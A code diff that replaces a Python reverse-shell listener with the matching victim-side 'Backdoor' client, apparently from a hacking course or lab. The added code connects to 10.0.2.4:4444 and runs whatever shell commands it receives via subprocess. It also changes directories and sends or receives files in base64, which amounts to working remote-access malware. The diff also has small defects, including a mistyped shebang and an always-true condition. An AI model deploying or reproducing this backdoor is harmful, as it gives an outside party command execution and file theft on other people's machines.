@@ -1,61 +1,83 @@
-#!/usr/bin/env python
+#!/usr/bun/env python
 
-import socket, json, base64
+import socket
+import subprocess
+import json
+import os
+import base64 
 
-class Listener:
-    def __init__(self, ip, port):
-        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        listener.bind((ip, port))
-        listener.listen(0)
-        print("[+] Waiting for connection.")
-        self.connection, address = listener.accept()
-        print("[+] Connection received from " + str(address) + ".")
+class Backdoor:
+	def __init__(self, ip, port):
+		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		self.connection.connect((ip, port))
 
-    def reliable_send(self, data):
-        json_data = json.dumps(data) #(3)Command string is parameterized into 'data' string, then is turned into json string format and passed into the json_data variable.
-        json_data = json_data.encode("UTF-8") #(4) The json data stream is made ready for tcp upload by being turned into a bytes object.
-        self.connection.send(json_data) #(5) The json_data byte object is uploaded via tcp to the target pc.
+	def reliable_rec(self):
+		complete_data = ""
+		while True:
+			try:
+				json_data = self.connection.recv(1024)
+				json_data = json_data.decode("ASCII")
+				complete_data = complete_data + json_data
+				return json.loads(complete_data)
+			except ValueError:
+				continue
+				
+	def reliable_send(self, data):
+		try:
+			data = str(data, encoding='cp1252')
+		except TypeError:
+			data = data
+		json_data = json.dumps(data)
+		json_data = json_data.encode("UTF-8")
+		self.connection.send(json_data)
 
-    def reliable_rec(self):
-        complete_data = ""
-        while True: #starts a loop
-            try:
-                json_data = self.connection.recv(1024) #(7) initializes the receiving connection, as well as puts the recieved data into a 1024 object variable, recieve type must be UTF-8.
-                json_data = json_data.decode("ASCII") #(8) Changes the UTF-8 into string readable by the json_string command.
-                complete_data = complete_data + json_data #(9) takes the json string and adds it to the initialized variable, continues adding in loop until json_data is complete.
-                return json.loads(complete_data) #(10) (CHECKS IF DATA IS COMPLETE) Decodes the json_string into regular string, and returns the string back to the execute_remotely function
-            except ValueError: #(11) Because the json.loads function will through a ValueError if the json data is not complete, this allows us to add onto the string until it is complete.
-                continue
+	def execute_system_command(self, command):
+		return subprocess.check_output(command, shell=True)
 
-    def write_file(self, path, content):
-        with open(path, "wb") as file:
-            content = content.encode("UTF-8")
-            file.write(base64.b64decode(content))
-            return "[+] Download successful."
+	def change_working_directory_to(self, path):
+		try:
+			os.chdir(path)
+			return "Changing working directory to " + path
+		except OSError:
+			return "Path is incorrect."
+	def read_file(self, path):
+		with open(path, "rb") as file:
+			return base64.b64encode(file.read())
+	def write_file(self, path, content):
+		with open(path, "wb") as file:
+			content = content.encode("UTF-8")
+			file.write(base64.b64decode(content))
+			return "[+] Upload successful."
+	
+	def run(self):
+		while True:
+			command = self.reliable_rec()
+			if command[0] == "exit":
+				self.connection.close()
+				exit()
 
-    def read_file(self, path):
-        with open(path, "rb") as file:
-            return base64.b64encode(file.read())
+			elif command[0] == "cd" and len(command) > 1:
+				command_result = self.change_working_directory_to(command [1])
 
-    def execute_remotely(self, command):
-        self.reliable_send(command)  # (2) Passes the command string to the send function.
-        if command[0] == "exit":
-                self.connection.close()
-                exit()
-        return self.reliable_rec() #(6) After sending the command (3-5), calls the receive function to receive output.
+			elif command[0] == "download":
+				try:
+					command_result = self.read_file(command[1])
+				except FileNotFoundError:
+					command_result = "The file was not found, try again"
 
-    def run(self):
-        while True:
-            command = input('>> ')
-            command = command.split(" ")
-            result = self.execute_remotely(command) #Starts flow (1), passes command string to execute remotely.
-            if command[0] == "download":
-                result = self.write_file(command[1], result)
-            elif command[0] == "upload":
-                file_content = self.read_file(command[1])
-                command.append(file_content)
-            print(result) #(11) The final string stored in the result variable is printed, and thus the loop is started again.
+			elif command[0] == "upload":
+				command_result = self.write_file(command[1], command[2])
 
-my_listener = Listener("10.0.2.4", 4444)
-my_listener.run()
+			elif (command[0] != "cd" or command[0] != "download" or command[0] != "exit" or command[0] != "upload"):
+				try:
+					command_result = self.execute_system_command(command)
+				except:
+					command_result = ('[-] Command could not execute.\n')
+
+			self.reliable_send(command_result)
+
+			
+
+my_backdoor = Backdoor("10.0.2.4", 4444)
+my_backdoor.run()
+
